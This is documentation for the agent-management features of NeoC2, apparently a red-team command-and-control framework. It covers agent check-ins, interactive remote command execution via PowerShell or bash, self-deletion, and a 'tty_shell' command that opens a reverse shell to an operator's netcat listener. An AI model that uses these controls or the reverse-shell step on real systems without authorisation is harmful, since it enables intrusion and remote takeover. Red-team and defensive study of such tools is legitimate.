# Agent Management


The Neo C2 Server automatically alerts all connected clients when an agent is active or registers with the server : `[+] NEW AGENT: ID=c272-xxxx HOST=xxxx USER=root IP=127.0.0.1 OS=xxxx`

## Agent Lifecycle

Agents in NeoC2 follow a complete lifecycle:

- **Registration**: Agents connect and register with the C2
- **Heartbeat**: Regular check-ins to maintain connection
- **Tasking**: Receive and execute commands
- **Results**: Send back execution output
- **Interaction**: Real-time command execution
- **Termination**: Removal from management

## Agent Commands

```
# List all active agents
agent list
beacon			    

# Enter interactive mode with agent
agent interact <agent_id>
interact <agent_id>	   

# Get detailed agent information
agent info <agent_id>  

# Get detailed current agent information in interactive mode
info

# Activate self-deletion & remove agent from management
agent kill <agent_id>
```

## Agent Status Indicators

- Active: Agent regularly checking in
- Inactive: Agent not checking in (but not removed)
- Removed: Agent explicitly killed/removed


## Interactive Mode

Task-based Interactive mode provides real-time command execution. When activated:

1. Agent polling frequency increases from 30s to 1s
2. Agent switches from the standard queued api to the interactive api
3. Commands execute in real-time
4. Results return in real-time
5. Session maintained until 'back' command

### Entering Interactive Mode

```
NeoC2 > interact <agent-id>
# Prompt changes to:
NeoC2 [INTERACTIVE] >
```

### Interactive Commands

Commands prefixed with `cmd <command>` typed in interactive mode executes as Interactive task directly on the agent(Uses powershell.exe on Windows & Bash shell on linux):
```
NeoC2 [INTERACTIVE:abc123] > cmd whoami
NeoC2 [INTERACTIVE:abc123] > cmd pwd
NeoC2 [INTERACTIVE:abc123] > cmd ls -la
NeoC2 [INTERACTIVE:abc123] > back
```

#### Change Agent profile configured heartbeat at runtime:

```
NeoC2 [INTERACTIVE:abc123] > sleep 2
# Kill agent process
NeoC2 [INTERACTIVE:abc123] >  kill
```

### Interactive Mode Features

- **Real-time Execution**: Fast polling for immediate response
- **Persistent Storage**: All results stored in database
- **Timeout Recovery**: Retrieve late results with result command
- **Cross-platform**: Works on Windows/Linux/macOS agents

## TTY Shell

Start a netcat listener in another terminal and send the command below to the agent. This upgrades interaction with an agent from a task-based interactive mode to a complete TTY Shell
```
NeoC2 > tty_shell <ip> <port> # default port is 5000
```
